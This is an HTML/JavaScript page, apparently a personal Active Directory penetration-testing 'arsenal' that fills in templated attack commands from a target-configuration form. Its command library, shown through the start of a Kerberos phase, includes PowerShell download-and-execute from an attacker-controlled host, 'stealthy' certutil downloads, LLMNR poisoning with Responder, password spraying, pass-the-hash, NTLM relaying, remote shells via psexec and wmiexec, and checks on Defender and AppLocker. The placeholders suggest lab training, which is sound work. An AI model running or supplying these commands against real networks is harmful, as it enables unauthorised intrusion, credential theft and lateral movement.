
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD PenTest Arsenal | by @mahdiesta</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg-void: #050508;
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-tertiary: #1a1a25;
            --bg-elevated: #22222f;
            --accent-primary: #ff2d55;
            --accent-secondary: #ff6b8a;
            --accent-glow: rgba(255, 45, 85, 0.4);
            --cyber-green: #00ff9d;
            --cyber-green-dim: #00cc7d;
            --cyber-green-glow: rgba(0, 255, 157, 0.3);
            --cyber-blue: #00d4ff;
            --cyber-orange: #ff9500;
            --cyber-yellow: #ffcc00;
            --cyber-purple: #bf5af2;
            --text-primary: #f0f0f5;
            --text-secondary: #8888a0;
            --text-muted: #55556a;
            --border-color: #2a2a3a;
        }

        html { scroll-behavior: smooth; }

        body {
            background: var(--bg-void);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            min-height: 100vh;
            line-height: 1.6;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: 
                linear-gradient(90deg, rgba(255, 45, 85, 0.02) 1px, transparent 1px),
                linear-gradient(rgba(255, 45, 85, 0.02) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        .header {
            background: linear-gradient(180deg, var(--bg-secondary) 0%, var(--bg-void) 100%);
            border-bottom: 1px solid var(--accent-primary);
            padding: 15px 25px;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 0 30px var(--accent-glow);
        }

        .header-content {
            max-width: 1900px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 45px; height: 45px;
            background: linear-gradient(135deg, var(--accent-primary), var(--cyber-purple));
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .logo-text h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.3em;
            font-weight: 800;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
        }

        .logo-text .subtitle {
            font-size: 0.65em;
            color: var(--text-secondary);
            letter-spacing: 1px;
        }

        .header-stats {
            display: flex;
            gap: 15px;
        }

        .stat-pill {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 6px 14px;
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.8em;
        }

        .stat-pill .num { color: var(--cyber-green); font-weight: 700; }
        .stat-pill .label { color: var(--text-secondary); }

        .main-container {
            display: grid;
            grid-template-columns: 380px 1fr;
            min-height: calc(100vh - 75px);
            position: relative;
            z-index: 1;
        }

        .sidebar {
            background: var(--bg-primary);
            border-right: 1px solid var(--border-color);
            padding: 20px;
            overflow-y: auto;
            max-height: calc(100vh - 75px);
            position: sticky;
            top: 75px;
        }

        .sidebar::-webkit-scrollbar { width: 5px; }
        .sidebar::-webkit-scrollbar-track { background: var(--bg-void); }
        .sidebar::-webkit-scrollbar-thumb { background: var(--accent-primary); border-radius: 3px; }

        .section-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid var(--border-color);
        }

        .section-header .icon {
            width: 28px; height: 28px;
            background: linear-gradient(135deg, var(--accent-primary), transparent);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }

        .section-header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.8em;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .config-section { margin-bottom: 20px; }
        .form-grid { display: grid; gap: 10px; }

        .form-group label {
            display: block;
            font-size: 0.7em;
            color: var(--text-secondary);
            margin-bottom: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px 12px;
            background: var(--bg-void);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--cyber-green);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85em;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px var(--accent-glow);
        }

        .form-group input::placeholder { color: var(--text-muted); }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }

        .btn-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-top: 15px;
        }

        .btn {
            padding: 10px 14px;
            border: none;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--accent-primary), var(--cyber-purple));
            color: white;
            grid-column: span 2;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px var(--accent-glow);
        }

        .btn-secondary {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }

        .btn-secondary:hover {
            border-color: var(--accent-primary);
        }

        .target-display {
            background: var(--bg-void);
            border: 1px solid var(--cyber-green-dim);
            border-radius: 8px;
            padding: 12px;
            margin-top: 15px;
            display: none;
        }

        .target-display.active { display: block; }

        .target-display h3 {
            color: var(--cyber-green);
            font-size: 0.75em;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }

        .target-item {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 0.75em;
            border-bottom: 1px solid var(--border-color);
        }

        .target-item:last-child { border-bottom: none; }
        .target-item .key { color: var(--text-secondary); }
        .target-item .value { color: var(--cyber-green); word-break: break-all; max-width: 55%; text-align: right; }

        .quick-actions {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid var(--border-color);
        }

        .quick-actions h3 {
            font-size: 0.75em;
            color: var(--text-secondary);
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .quick-btn-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px;
        }

        .quick-btn {
            padding: 8px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            color: var(--text-primary);
            font-size: 0.7em;
            cursor: pointer;
            transition: all 0.2s;
        }

        .quick-btn:hover {
            border-color: var(--cyber-blue);
            color: var(--cyber-blue);
        }

        .main-content {
            padding: 20px;
            overflow-y: auto;
        }

        .filter-bar {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 12px 15px;
            margin-bottom: 20px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .search-box {
            flex: 1;
            min-width: 200px;
            position: relative;
        }

        .search-box input {
            width: 100%;
            padding: 8px 12px 8px 35px;
            background: var(--bg-void);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85em;
        }

        .search-box input:focus {
            outline: none;
            border-color: var(--accent-primary);
        }

        .search-box::before {
            content: 'üîç';
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            opacity: 0.5;
        }

        .filter-select {
            padding: 8px 12px;
            background: var(--bg-void);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8em;
            min-width: 140px;
        }

        .filter-select:focus {
            outline: none;
            border-color: var(--accent-primary);
        }

        .filter-btn {
            padding: 8px 15px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8em;
            cursor: pointer;
        }

        .filter-btn:hover {
            border-color: var(--accent-primary);
            color: var(--accent-primary);
        }

        .phase-group { margin-bottom: 25px; }

        .phase-header {
            background: linear-gradient(90deg, var(--accent-primary), transparent);
            padding: 12px 20px;
            border-radius: 8px 8px 0 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
        }

        .phase-header h3 {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.9em;
            font-weight: 700;
            color: white;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .phase-header .count {
            background: rgba(255, 255, 255, 0.2);
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 0.75em;
        }

        .command-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
            gap: 12px;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-top: none;
            border-radius: 0 0 8px 8px;
        }

        .command-grid.collapsed { display: none; }

        .command-card {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            transition: all 0.3s ease;
            position: relative;
        }

        .command-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0;
            width: 3px; height: 100%;
            background: var(--accent-primary);
            opacity: 0;
            transition: opacity 0.3s;
            border-radius: 8px 0 0 8px;
        }

        .command-card:hover {
            border-color: var(--accent-primary);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        .command-card:hover::before { opacity: 1; }

        .command-card.copied {
            border-color: var(--cyber-green);
            box-shadow: 0 0 20px var(--cyber-green-glow);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            gap: 8px;
            margin-bottom: 8px;
        }

        .card-title {
            font-size: 0.9em;
            font-weight: 600;
            color: var(--accent-secondary);
            flex: 1;
        }

        .card-badges {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }

        .badge {
            font-size: 0.6em;
            padding: 2px 6px;
            border-radius: 3px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            font-weight: 600;
        }

        .badge-none { background: rgba(0, 255, 157, 0.15); color: var(--cyber-green); border: 1px solid var(--cyber-green-dim); }
        .badge-required { background: rgba(255, 149, 0, 0.15); color: var(--cyber-orange); border: 1px solid var(--cyber-orange); }
        .badge-linux { background: rgba(0, 212, 255, 0.15); color: var(--cyber-blue); border: 1px solid var(--cyber-blue); }
        .badge-windows { background: rgba(255, 45, 85, 0.15); color: var(--accent-secondary); border: 1px solid var(--accent-primary); }
        .badge-both { background: rgba(191, 90, 242, 0.15); color: var(--cyber-purple); border: 1px solid var(--cyber-purple); }

        .card-description {
            font-size: 0.75em;
            color: var(--text-secondary);
            margin-bottom: 10px;
            line-height: 1.4;
        }

        .card-meta {
            display: flex;
            gap: 6px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .meta-tag {
            font-size: 0.65em;
            padding: 3px 8px;
            background: var(--bg-tertiary);
            border-radius: 3px;
            color: var(--text-secondary);
        }

        .command-box {
            background: var(--bg-void);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 10px 12px;
            margin-bottom: 10px;
        }

        .command-text {
            color: var(--cyber-green);
            font-size: 0.75em;
            line-height: 1.7;
            word-break: break-word;
            white-space: pre-wrap;
            max-height: 120px;
            overflow-y: auto;
        }

        .command-text::-webkit-scrollbar { width: 4px; }
        .command-text::-webkit-scrollbar-thumb { background: var(--cyber-green-dim); border-radius: 2px; }

        .copy-btn {
            width: 100%;
            padding: 8px 12px;
            background: linear-gradient(135deg, var(--accent-primary), var(--cyber-purple));
            border: none;
            border-radius: 5px;
            color: white;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
        }

        .copy-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 4px 12px var(--accent-glow);
        }

        .copy-toast {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%) scale(0.8);
            background: var(--cyber-green);
            color: var(--bg-void);
            padding: 15px 30px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 1em;
            opacity: 0;
            pointer-events: none;
            z-index: 10000;
            transition: all 0.3s ease;
            box-shadow: 0 0 40px var(--cyber-green-glow);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .copy-toast.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }

        .no-results {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-secondary);
        }

        .no-results .icon { font-size: 3em; margin-bottom: 15px; opacity: 0.3; }
        .no-results h3 { font-size: 1.1em; color: var(--text-primary); }

        @media (max-width: 1200px) {
            .main-container { grid-template-columns: 1fr; }
            .sidebar { max-height: none; position: relative; top: 0; }
            .command-grid { grid-template-columns: 1fr; }
        }

        @media (max-width: 768px) {
            .header-content { flex-direction: column; text-align: center; }
            .filter-bar { flex-direction: column; }
            .search-box { width: 100%; }
            .filter-select { width: 100%; }
        }
    </style>
</head>
<body>

<header class="header">
    <div class="header-content">
        <div class="logo-section">
            <div class="logo-icon">‚öî</div>
            <div class="logo-text">
                <h1>AD PenTest Arsenal</h1>
                <div class="subtitle">by @mahdiesta</div>
            </div>
        </div>
        <div class="header-stats">
            <div class="stat-pill"><span class="num" id="totalCmds">0</span><span class="label">Total</span></div>
            <div class="stat-pill"><span class="num" id="visibleCmds">0</span><span class="label">Visible</span></div>
            <div class="stat-pill"><span class="num" id="readyCmds">0</span><span class="label">Ready</span></div>
        </div>
    </div>
</header>

<div class="main-container">
    <aside class="sidebar">
        <div class="config-section">
            <div class="section-header">
                <div class="icon">üéØ</div>
                <h2>Target Configuration</h2>
            </div>
            <div class="form-grid">
                <div class="form-group">
                    <label>Domain Controller (FQDN)</label>
                    <input type="text" id="dcName" placeholder="DC01.INLANEFREIGHT.LOCAL">
                </div>
                <div class="form-group">
                    <label>DC IP Address</label>
                    <input type="text" id="dcIP" placeholder="172.16.5.5">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Domain (FQDN)</label>
                        <input type="text" id="domain" placeholder="INLANEFREIGHT.LOCAL">
                    </div>
                    <div class="form-group">
                        <label>NetBIOS Name</label>
                        <input type="text" id="domainShort" placeholder="INLANEFREIGHT">
                    </div>
                </div>
            </div>
        </div>

        <div class="config-section">
            <div class="section-header">
                <div class="icon">üîë</div>
                <h2>Credentials</h2>
            </div>
            <div class="form-grid">
                <div class="form-group">
                    <label>Attacker IP</label>
                    <input type="text" id="attackerIP" placeholder="10.10.14.5">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Username</label>
                        <input type="text" id="username" placeholder="htb-student">
                    </div>
                    <div class="form-group">
                        <label>Password</label>
                        <input type="password" id="password" placeholder="Password123">
                    </div>
                </div>
                <div class="form-group">
                    <label>NT Hash (optional)</label>
                    <input type="text" id="ntHash" placeholder="aad3b435b51404eeaad3b435b51404ee">
                </div>
                <div class="form-group">
                    <label>Target User (for attacks)</label>
                    <input type="text" id="targetUser" placeholder="sqlsvc">
                </div>
            </div>
        </div>

        <div class="btn-grid">
            <button class="btn btn-primary" onclick="loadCommands()">‚ö° Generate Commands</button>
            <button class="btn btn-secondary" onclick="clearConfig()">üîÑ Reset</button>
            <button class="btn btn-secondary" onclick="exportConfig()">üíæ Export</button>
        </div>

        <div class="target-display" id="targetDisplay">
            <h3>üì° Active Target</h3>
            <div id="targetItems"></div>
        </div>

        <div class="quick-actions">
            <h3>‚ö° Quick Filters</h3>
            <div class="quick-btn-grid">
                <button class="quick-btn" onclick="quickFilter('no creds')">No Creds</button>
                <button class="quick-btn" onclick="quickFilter('kerberos')">Kerberos</button>
                <button class="quick-btn" onclick="quickFilter('bloodhound')">BloodHound</button>
                <button class="quick-btn" onclick="quickFilter('mimikatz')">Mimikatz</button>
                <button class="quick-btn" onclick="quickFilter('netexec')">NetExec</button>
                <button class="quick-btn" onclick="quickFilter('impacket')">Impacket</button>
                <button class="quick-btn" onclick="quickFilter('powerview')">PowerView</button>
                <button class="quick-btn" onclick="quickFilter('rubeus')">Rubeus</button>
            </div>
        </div>
    </aside>

    <main class="main-content">
        <div class="filter-bar">
            <div class="search-box">
                <input type="text" id="searchInput" placeholder="Search commands..." oninput="applyFilters()">
            </div>
            <select class="filter-select" id="phaseFilter" onchange="applyFilters()">
                <option value="">All Phases</option>
            </select>
            <select class="filter-select" id="credsFilter" onchange="applyFilters()">
                <option value="">All Auth</option>
                <option value="none">No Creds</option>
                <option value="required">Requires Creds</option>
            </select>
            <select class="filter-select" id="osFilter" onchange="applyFilters()">
                <option value="">All Platforms</option>
                <option value="linux">Linux</option>
                <option value="windows">Windows</option>
                <option value="both">Cross-Platform</option>
            </select>
            <button class="filter-btn" onclick="resetFilters()">Clear</button>
        </div>
        <div id="commandContainer"></div>
    </main>
</div>

<div class="copy-toast" id="copyToast">‚úì Copied!</div>

<script>
const commandLibrary = [
    // PHASE 0: SETUP
    { phase: "Phase 0: Setup", title: "Python HTTP Server", description: "Host files for download", category: "File Transfer", tool: "Python", os: "linux", requiresCreds: "none", command: "python3 -m http.server 8080" },
    { phase: "Phase 0: Setup", title: "Impacket SMB Server", description: "Host files via SMB with auth", category: "File Transfer", tool: "Impacket", os: "linux", requiresCreds: "none", command: "impacket-smbserver -smb2support share $(pwd)" },
    { phase: "Phase 0: Setup", title: "PowerShell Download & Execute", description: "Download and execute PS script in memory", category: "File Transfer", tool: "PowerShell", os: "windows", requiresCreds: "none", command: "IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}:8080/PowerView.ps1')" },
    { phase: "Phase 0: Setup", title: "PowerShell Download File", description: "Download file to disk", category: "File Transfer", tool: "PowerShell", os: "windows", requiresCreds: "none", command: "Invoke-WebRequest -Uri 'http://{ATTACKER_IP}:8080/tool.exe' -OutFile 'C:\\Windows\\Temp\\tool.exe'" },
    { phase: "Phase 0: Setup", title: "Certutil Download", description: "Download via certutil (stealthy)", category: "File Transfer", tool: "certutil", os: "windows", requiresCreds: "none", command: "certutil -urlcache -split -f http://{ATTACKER_IP}:8080/tool.exe C:\\Windows\\Temp\\tool.exe" },

    // PHASE 1: INITIAL ENUMERATION
    { phase: "Phase 1: Initial Enumeration", title: "DNS - Find Domain Controllers", description: "Query SRV records for DCs", category: "DNS", tool: "nslookup", os: "both", requiresCreds: "none", command: "nslookup -type=SRV _ldap._tcp.dc._msdcs.{DOMAIN}" },
    { phase: "Phase 1: Initial Enumeration", title: "DNS - Zone Transfer", description: "Attempt DNS zone transfer", category: "DNS", tool: "dig", os: "linux", requiresCreds: "none", command: "dig axfr {DOMAIN} @{DC_IP}" },
    { phase: "Phase 1: Initial Enumeration", title: "Nmap - AD Ports Quick", description: "Scan common AD ports", category: "Network", tool: "Nmap", os: "linux", requiresCreds: "none", command: "nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985 {DC_IP} -oN nmap-ad.txt" },
    { phase: "Phase 1: Initial Enumeration", title: "Nmap - Full Scan", description: "Comprehensive port scan", category: "Network", tool: "Nmap", os: "linux", requiresCreds: "none", command: "nmap -Pn -sC -sV -p- --min-rate=1000 {DC_IP} -oN nmap-full.txt" },
    { phase: "Phase 1: Initial Enumeration", title: "Responder - Passive", description: "Analyze LLMNR/NBT-NS traffic", category: "LLMNR/NBT-NS", tool: "Responder", os: "linux", requiresCreds: "none", command: "sudo responder -I eth0 -A" },
    { phase: "Phase 1: Initial Enumeration", title: "Responder - Active Poisoning", description: "Poison requests, capture hashes", category: "LLMNR/NBT-NS", tool: "Responder", os: "linux", requiresCreds: "none", command: "sudo responder -I eth0 -wPv" },
    { phase: "Phase 1: Initial Enumeration", title: "Crack NTLMv2 - Hashcat", description: "Crack NTLMv2 hashes", category: "Cracking", tool: "Hashcat", os: "linux", requiresCreds: "none", command: "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt" },
    { phase: "Phase 1: Initial Enumeration", title: "Kerbrute - User Enum", description: "Enumerate valid users via Kerberos", category: "User Enum", tool: "Kerbrute", os: "linux", requiresCreds: "none", command: "kerbrute userenum -d {DOMAIN} --dc {DC_IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt" },
    { phase: "Phase 1: Initial Enumeration", title: "enum4linux-ng - Full", description: "Comprehensive SMB/RPC enumeration", category: "SMB", tool: "enum4linux-ng", os: "linux", requiresCreds: "none", command: "enum4linux-ng -A {DC_IP} -oA enum4linux" },
    { phase: "Phase 1: Initial Enumeration", title: "rpcclient - NULL Session", description: "RPC enumeration via NULL session", category: "RPC", tool: "rpcclient", os: "linux", requiresCreds: "none", command: "rpcclient -U '' -N {DC_IP} -c 'enumdomusers;enumdomgroups;getdompwinfo'" },
    { phase: "Phase 1: Initial Enumeration", title: "NetExec - NULL Users", description: "Enumerate users without creds", category: "SMB", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {DC_IP} -u '' -p '' --users" },
    { phase: "Phase 1: Initial Enumeration", title: "LDAP Anonymous Bind", description: "Test anonymous LDAP access", category: "LDAP", tool: "ldapsearch", os: "linux", requiresCreds: "none", command: "ldapsearch -H ldap://{DC_IP} -x -s base namingcontexts" },

    // PHASE 2: PASSWORD ATTACKS
    { phase: "Phase 2: Password Attacks", title: "Password Policy Check", description: "Check policy before spraying", category: "Pre-Attack", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {DC_IP} -u '' -p '' --pass-pol" },
    { phase: "Phase 2: Password Attacks", title: "NetExec - Password Spray", description: "Spray password against users", category: "Spray", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {DC_IP} -u users.txt -p 'Welcome1!' --continue-on-success" },
    { phase: "Phase 2: Password Attacks", title: "Kerbrute - Password Spray", description: "Kerberos-based spray (stealthy)", category: "Spray", tool: "Kerbrute", os: "linux", requiresCreds: "none", command: "kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} users.txt 'Welcome1!'" },
    { phase: "Phase 2: Password Attacks", title: "NetExec - Verify Creds", description: "Verify discovered credentials", category: "Validation", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}'" },
    { phase: "Phase 2: Password Attacks", title: "NetExec - Hash Spray (PTH)", description: "Pass-the-Hash spray", category: "Spray", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {DC_IP} -u '{USERNAME}' -H '{NTHASH}'" },
    { phase: "Phase 2: Password Attacks", title: "SMB Relay Setup", description: "Relay captured auth to targets", category: "Relay", tool: "Impacket", os: "linux", requiresCreds: "none", command: "impacket-ntlmrelayx -tf targets.txt -smb2support -i" },

    // PHASE 3: CREDENTIALED ENUMERATION
    { phase: "Phase 3: Credentialed Enumeration", title: "Evil-WinRM", description: "WinRM shell access", category: "Access", tool: "Evil-WinRM", os: "linux", requiresCreds: "required", command: "evil-winrm -i {DC_IP} -u '{USERNAME}' -p '{PASSWORD}'" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PSExec", description: "Remote shell via SMB", category: "Access", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-psexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}" },
    { phase: "Phase 3: Credentialed Enumeration", title: "WMIExec", description: "Remote shell via WMI", category: "Access", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-wmiexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}" },
    { phase: "Phase 3: Credentialed Enumeration", title: "SMBExec", description: "Remote shell via SMB (no admin$)", category: "Access", tool: "Impacket", os: "linux", requiresCreds: "required", command: "impacket-smbexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}" },
    { phase: "Phase 3: Credentialed Enumeration", title: "RDP Connection", description: "Remote Desktop connection", category: "Access", tool: "xfreerdp", os: "linux", requiresCreds: "required", command: "xfreerdp /v:{DC_IP} /u:'{DOMAIN}\\{USERNAME}' /p:'{PASSWORD}' /cert-ignore" },
    { phase: "Phase 3: Credentialed Enumeration", title: "NetExec - Users", description: "List all domain users", category: "AD Enum", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' --users" },
    { phase: "Phase 3: Credentialed Enumeration", title: "NetExec - Groups", description: "List all domain groups", category: "AD Enum", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' --groups" },
    { phase: "Phase 3: Credentialed Enumeration", title: "NetExec - Shares", description: "Enumerate SMB shares", category: "Share Enum", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' --shares" },
    { phase: "Phase 3: Credentialed Enumeration", title: "NetExec - Spider Shares", description: "Search shares for files", category: "Share Enum", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec smb {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -M spider_plus" },
    { phase: "Phase 3: Credentialed Enumeration", title: "SMBMap", description: "Map shares with permissions", category: "Share Enum", tool: "SMBMap", os: "linux", requiresCreds: "required", command: "smbmap -H {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN}" },
    { phase: "Phase 3: Credentialed Enumeration", title: "BloodHound - Python", description: "Collect AD data from Linux", category: "BloodHound", tool: "BloodHound", os: "linux", requiresCreds: "required", command: "bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {DC_IP} -d {DOMAIN} -c all --zip" },
    { phase: "Phase 3: Credentialed Enumeration", title: "BloodHound - SharpHound", description: "Collect AD data from Windows", category: "BloodHound", tool: "BloodHound", os: "windows", requiresCreds: "required", command: ".\\SharpHound.exe -c All --zipfilename bh-{DOMAIN_SHORT}.zip" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Load", description: "Import PowerView module", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Import-Module .\\PowerView.ps1" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Domain Info", description: "Get domain information", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-Domain" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Users", description: "Get all domain users", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainUser | Select-Object samaccountname,description,memberof" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Users with SPNs", description: "Find kerberoastable accounts", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - AS-REP Roastable", description: "Find accounts without preauth", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Domain Admins", description: "Get DA group members", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Computers", description: "Get all domain computers", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainComputer | Select-Object name,dnshostname,operatingsystem" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Trusts", description: "List domain trusts", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainTrust" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - Find Local Admin", description: "Find where you have admin", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Find-LocalAdminAccess -Verbose" },
    { phase: "Phase 3: Credentialed Enumeration", title: "PowerView - GPOs", description: "List all GPOs", category: "PowerView", tool: "PowerView", os: "windows", requiresCreds: "required", command: "Get-DomainGPO | Select-Object displayname,gpcfilesyspath" },

    // PHASE 4: SECURITY CONTROLS
    { phase: "Phase 4: Security Controls", title: "Defender Status", description: "Check Windows Defender", category: "Defenses", tool: "PowerShell", os: "windows", requiresCreds: "required", command: "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled" },
    { phase: "Phase 4: Security Controls", title: "AppLocker Policy", description: "View AppLocker rules", category: "Defenses", tool: "PowerShell", os: "windows", requiresCreds: "required", command: "Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections" },
    { phase: "Phase 4: Security Controls", title: "PowerShell Language Mode", description: "Check PS restrictions", category: "Defenses", tool: "PowerShell", os: "windows", requiresCreds: "required", command: "$ExecutionContext.SessionState.LanguageMode" },
    { phase: "Phase 4: Security Controls", title: "NetExec - LAPS Check", description: "Check for LAPS deployment", category: "LAPS", tool: "NetExec", os: "linux", requiresCreds: "required", command: "netexec ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -M laps" },
    { phase: "Phase 4: Security Controls", title: "Check SMB Signing", description: "Find relay targets", category: "Network", tool: "NetExec", os: "linux", requiresCreds: "none", command: "netexec smb {NETWORK}.0/24 --gen-relay-list relay-targets.txt" },

    // PHASE 5: KERBEROS ATTACKS
